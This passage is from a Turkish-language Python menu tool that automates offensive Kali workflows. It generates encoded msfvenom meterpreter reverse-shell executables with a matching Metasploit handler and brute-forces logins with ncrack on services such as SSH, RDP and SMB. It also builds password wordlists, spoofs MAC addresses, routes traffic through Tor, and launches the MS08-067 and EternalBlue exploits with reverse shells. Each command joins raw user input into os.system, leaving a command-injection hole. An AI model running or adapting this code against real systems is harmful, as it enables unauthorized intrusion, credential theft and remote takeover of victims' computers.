                "    Yüklemek İstediğinizi Payloadı Giriniz.\n (Varsayılan windows/meterpreter/reverse_tcp): ")
            if payload == "":
                payload = "windows/meterpreter/reverse_tcp"
            IpAdress = input("Ip Adresinizi Giriniz: ")
            Lport = input("Dinlenicek Port Numarasını Giriniz: ")
            dosyayolu = input("Exe Dosyasının Yolunu Belirtiniz: (/root/Desktop/ ")
            dosyaismi = input("Exe Dosyasının İsmini Giriniz: (örneğin hack.exe) ")
            os.system(
                "msfvenom -p " + payload + " LHOST=" + IpAdress + " LPORT=" + Lport + " -e cmd/powershell_base64 -i 5 -f exe>" + dosyayolu + dosyaismi)
            with open("Payloadbilgis.txt", "w") as dosya:
                dosya.writelines(["use exploit/multi/handler\n", "set payload "])
                dosya.write(payload)
                dosya.writelines(["\nset LHOST "])
                dosya.write(IpAdress)
                dosya.writelines(["\nset LPORT "])
                dosya.write(Lport)
                dosya.writelines(["\nexploit"])
            os.system("msfconsole -r Payloadbilgis.txt")

########################################################################################################################
    elif islem == "4":
        print("""
        -------Hangi Aracı Kullanmak İstersiniz -------
        1) Crunch
        2) Port Brute Force

        """)
        secim = input("Hangi Aracı Kullanmak İstersiniz: ")
########################################################################################################################
        if secim == "1":
            os.system("figlet Crunch")
            minimumkarakter = input("Minimum Karakter Sayısını Girin: ")
            maksimumkarakter = input("Maksimum Karakter Sayısını Girin: ")
            karakter = input("İstediğiniz Karakterleri Girin: ")
            kayityeri = input("Kaydedilecek Yeri Girin (Örn /root/Desktop/sifre.txt): ")

            os.system("crunch " + minimumkarakter + " " + maksimumkarakter + " " + karakter + " -o " + kayityeri)
            print("İşlem Başarıyla Tamamlandı.")
########################################################################################################################
        elif secim == "2":
            print("""
            ----Hangi Porta Kaba Kuvvet Uygulamak İstersiniz----

            1) FTP
            2) SSH
            3) Telnet
            4) HTTP
            5) SMB
            6) RDP
            7) VNC
            8) PostgreSQL
            9)MySQL
                    """)

            islemno = input("İşlem Numarasını Girin: ")

            hedefip = input("Hedef İp Giriniz: ")

            kullaniciadi = input("Kullanıcı Adı Dosya Yolu: ")

            sifre = input("Sifrelerin Bulunduğu Dosya Yolu: ")

            if islemno == "1":
                os.system("ncrack -p 21 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)

            elif islemno == "2":
                os.system("ncrack -p 22 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)

            elif islemno == "3":
                os.system("ncrack -p 23 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)

            elif islemno == "4":
                os.system("ncrack -p 80 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)

            elif islemno == "5":
                os.system("ncrack -p 445 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)

            elif islemno == "6":
                os.system("ncrack -p 3389 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)

            elif islemno == "7":
                os.system("ncrack -p 5800 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)

            elif islemno == "8":
                os.system("ncrack -p 5432 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)

            elif islemno == "9":
                os.system("ncrack -p 3306 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)
########################################################################################################################
        elif secim == "3":
            os.system("figlet cewl")
            ## cewl -d 2 -m 8 https://www.metasploit.com - w / root / Desktop / Sozluk_Metasploit
            adres = input("Taramak İstediğiniz Adresi Giriniz: ")
            karakter = input("Sözlüklerin En Az Kaç Karakterden Oluşmasını İstersiniz: ")
            dizin = input("Kaydedilmesini İstediğiniz Yolu Giriniz: ")
            os.system("cewl -d 2 -m {} {} -w {}".format(karakter, adres, dizin))
########################################################################################################################

    elif islem == "5":
        print("""
        ------Hizmet Verdiğimi Kategorilerimiz----
        1) IP Değiştirme
        2) Mac Adresi Değiştirme

        """)
        islem = input("Hangi Aracı Kullanmak İstersiniz: ")
        if islem == "2":
            print("""
            ----Hizmet Verdiğimi Kategorilerimiz----

            1) MAC Adresi Random Belirle
            2) MAC Adresi Elle Belirle
            3) MAC Adresi Orijinale Döndür

            """)

            islemnum = input("İşlem No Girin: ")

            if islemnum == "1":
                os.system("ifconfig eth0 down")
                os.system("macchanger -r eth0")
                os.system("ifconfig eth0 up")
                print("\033[92mYeni MAC Adresi Random Belirlendi.")

            if islemnum == "2":
                macadres = input("Yeni MAC Adres Girin: ")
                os.system("ifconfig eth0 down")
                os.system("macchanger --mac " + macadres + " eth0")
                os.system("ifconfig eth0 up")
                print("\033[92mYeni MAC Adresi Elle Belirlendi.")

            if islemnum == "3":
                os.system("ifconfig eth0 down")
                os.system("macchanger -p eth0")
                os.system("ifconfig eth0 up")
                print("\033[92mMAC Adresi Orijinale Döndürüldü.")
########################################################################################################################
        if islem == "1":
            konum = os.listdir(".")
            if "torghost" in konum:
                print("Program Zaten Yüklü")
                os.chdir("torghost")
            else:
                os.system("git clone https://github.com/SusmithKrishnan/torghost.git")
                os.chdir("torghost")
                os.system("chmod +x install.sh")
                os.system("./install.sh")
            os.system("torghost start")
########################################################################################################################
    elif islem == "6":

        print("""
        Nmap Infoga Dnsmap Sn1per Dmitry Dnsenum

        Fierce Dnsdict6 Wafw00f NetDiscover Arp-Scan

         Nslookup Host Whois ZoneTransfer Dirb 
        -*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
        Nikto Golismero WPscan WAScan wig SQLiv Uniscan

        WAES a2sv Sqlmap 

        """)

        istenenarac = input("Hangi Araç Hakkında Bilgi Almak İstersiniz? ")
        os.system("clear")
        if istenenarac == "Nmap":
            print(" Bilgisayarların ve ağ makinalarının açık portlarının belirlenmesi \n çalışan servislerin taranması ve ortaya çıkarılması için yazılmış bir araçtır.")
        elif istenenarac == "Infoga":
            print(" Hedef sistemin içinden mail adreslerini bulmak için kullanılan bir araçtır ")
        elif istenenarac == "Dnsmap":
            print("Dnsmap bir alan adının(domain) alt alan adlarını(subdomain) öğrenmek \n  için kullanılan bir araçtır. Subdomainlerin Ip adreslerinide vermektedir.")
        elif istenenarac == "Sn1per":
            print("Sniper bilgi toplamak ve pentest işlemlerini otomatize ermek için gel- \n iştirilen bir araçtır.İçerisinde yok yoktur. 21 tool bulundurmaktadır.")
        elif istenenarac == "Dmitry":
            print("Subdomain, e-posta adresleri, tcp port taraması, whois sorgusu ve daha \n fazlası bu araç sayesinde kolaylıkla elde edebilirsiniz.")
        elif istenenarac == "Dnsenum":
            print("Server adı,alt alan adı, mail adresi gibi önemli bilgilere ulaşmamızı sağlar.")
        elif istenenarac == "Fierce":
            print("Fierce aracı etki alanına ait dns kayıtları tespit edilebilir.Belirtinen Ip\n bloklarındaki tüm Ip adresleri DNS sorguları gerçekleştirilebilir.")
        elif istenenarac == "Dnsdict6":
            print("Server adı,alt alan adı, mail adresi gibi önemli bilgilere ulaşmamızı sağlar.")
        elif istenenarac == "wafw00f":
            print(" Wafw00f basit bir güvenlik duvarı tespit etme aracıdır. Pluginler açısından  zengindir. ")

        elif istenenarac == "NetDiscover":
            print(
                "Kablosuz ağlar için geliştirilmiş dhcp sunucusu olmadan ağ adreslerini aktif/pasif durumunu inceleyen kesif aracıdır")

        elif istenenarac == "Arp-Scan":
            print("Aynı ağ üzerinde bulunduğumuz diüer araçlarını ip ve mac adreslerini bize verir.")

        elif istenenarac == "Dirb":
            print("Alt dizin keşfi yapmamızı sağlar. ")

        elif istenenarac == "Nslookup":
            print(
                "Nslookup kullarnarak bir web sitesi veya serverin çeşitli network durumlarını sorgulayaabilirsiniz. ")

        elif istenenarac == "Host":
            print("Bir IP nin sahip olduğu domain ve domainlerin point ettiği Ipleri bize verir.")

        elif istenenarac == "Whois":
            print("Bİr IP yada domain sahiplik bilgilerinin öğrenildiği sorgu tiplemesi. ")

        elif istenenarac == "ZoneTransfer":
            print("Bir Domainin aynı datayı paylaşan subdomainlerini bulmakta kullanılır. ")

        elif istenenarac == "Nikto":
            print(
                "Nikto belirlediğimiz hedefe internet ortamında keşfedilmiş web uygulama açıklarını ile sistemi tarar. ")

        elif istenenarac == "Golismero":
            print("Güvenlik Testi ve pentest analizinde kullanılan çok fonksiyonlu bir açık kaynak yazılımdır.")

        elif istenenarac == "WPscan":
            print("WordPress güvenlik tarama yazılımıdır. ")

        elif istenenarac == "WAScan":
            print("Web uygulama açıkları tespiti yapar.")

        elif istenenarac == "WAES":
            print("Web uygulama açıkları tespiti yapar.")

        elif istenenarac == "wig":
            print("Web uygulamaları hakkında bilgi verir.Zaafiyetler hakkında bilgi verir.")

        elif istenenarac == "SQLiv":
            print("SQL injection dork ile çoklu alan taraması yapar. ")

        elif istenenarac == "Uniscan":
            print("Hedef sitede Sql,Xss vb açıkları bulmamıza yarayan bir yazılımdır.")

        elif istenenarac == "a2sv":
            print("Web uygulamalarındaki SSL açıklarını taramak için kullanılan açık kaynaklı bir araçtır.")

        elif istenenarac == "Sqlmap":
            print("Boş yere yormayın beni arkadaşlar xD")

        else:
            print("Hatalı Bir İsim Girdiniz! (Büyük Küçük harf duyarlıdır) ")

    elif islem == "7":
        print("""
        ----Hizmet Verdiğimiz Kategorilerimiz----

        1) MS08_067
        2) MS17_010

        """)
        islem13 = input("Hangi Zaafiyeti Kullanmak İstersiniz? ")

        if islem13 == "1":
            print(
                "İlk olarak bilgi vermek isterim arkadaşlar \n Windows 2000 server ve altını ilgilendirmektedir.\nSMB(445) Portunu ilgilendirir.")
            IpAdress = input("Hedef Ip Adresini Giriniz: ")
            print("İlk olarak 445 Portunun Açık olduğundan Emin Olalım :D")
            os.system("nmap -p445 " + IpAdress + " -T4 -n")
            print("Eğer Açıksa İşlemimize Devam Edelim.")
            os.system("nmap --script smb-vuln-ms08-067.nse " + IpAdress + " -p445")
            print("Nmap Sonucunda Açık Olduğu Görünüyorsa İşlemlerimize Devam Edelim...")

            IPmiz = input("Ip Adresinizi Giriniz. ")
            with open("MS08-067.txt", "w") as dosya:
                dosya.writelines(["use exploit/windows/smb/ms08_067_netapi\n", "set RHOSTS "])
                dosya.write(IpAdress)
                dosya.writelines(["\nset payload windows/shell/reverse_tc"])
                dosya.writelines(["\nset LHOST "])
                dosya.write(IPmiz)
                dosya.writelines(["\nrun"])
            os.system("msfconsole -r MS08-067.txt")
        elif islem13 == "2":
            print(
                "İlk olarak bilgi vermek isterim arkadaşlar \n Etki alanı Windows 10'a kadar yükseltilmiştir.\nSMB(445) Portunu ilgilendirir.")
            IpAdress = input("Hedef Ip Adresini Giriniz: ")
            print("İlk olarak 445 Portunun Açık olduğundan Emin Olalım :D")
            os.system("nmap -p445 " + IpAdress + " -T4 -n")
            print("Eğer Açıksa İşlemimize Devam Edelim.")
            os.system("nmap --script smb-vuln-ms17-010.nse " + IpAdress + " -p445")
            print("Nmap Sonucunda Açık Olduğu Görünüyorsa İşlemlerimize Devam Edelim...")
            print(""" ----Kullanmanızı Önerdiğimiz Payloadlar----
                      1) windows/shell/reverse_tcp
                      2) generic/shell_reverse_tcp

            """)

            IPmiz = input("Ip Adresinizi Giriniz. ")
            payload = input("Seçmek İstediğiniz Payload Numarası: ")
            if payload == "1":
                payload = "windows/shell/reverse_tcp"
            else:
                payload = "generic/shell_reverse_tcp"
            with open("MS17-010.txt", "w") as dosya:
                dosya.writelines(["use exploit/windows/smb/ms17_010_eternalblue\n", "set RHOSTS "])
                dosya.write(IpAdress)
                dosya.writelines(["\nset VERIFY_ARCH false"])
                dosya.writelines(["\nset VERIFY_TARGET false"])
                dosya.writelines(["\nset payload "])
                dosya.write(payload)
                dosya.writelines(["\nset LHOST "])
                dosya.write(IPmiz)
                dosya.writelines(["\nrun"])
            os.system("msfconsole -r MS17-010.txt")
    elif islem == "8":
        slogan()
        print("\n\tBu Araç OverClick ve Persona Non Grata Aileleri İçin Pentest Araçlarını Barındıran\n\tBir Projedir.Amaç Dışı Kullanımından Doğacak Sorumluluk\n\tYamamen Kullanıcıya Aittir.\n\n\tSeri kullanım için yazılmıştır,  Yardımcı araçtır . \n\n\tPowered by  ykslkrkci | raif.py\n\n")
        input("[Enter]")
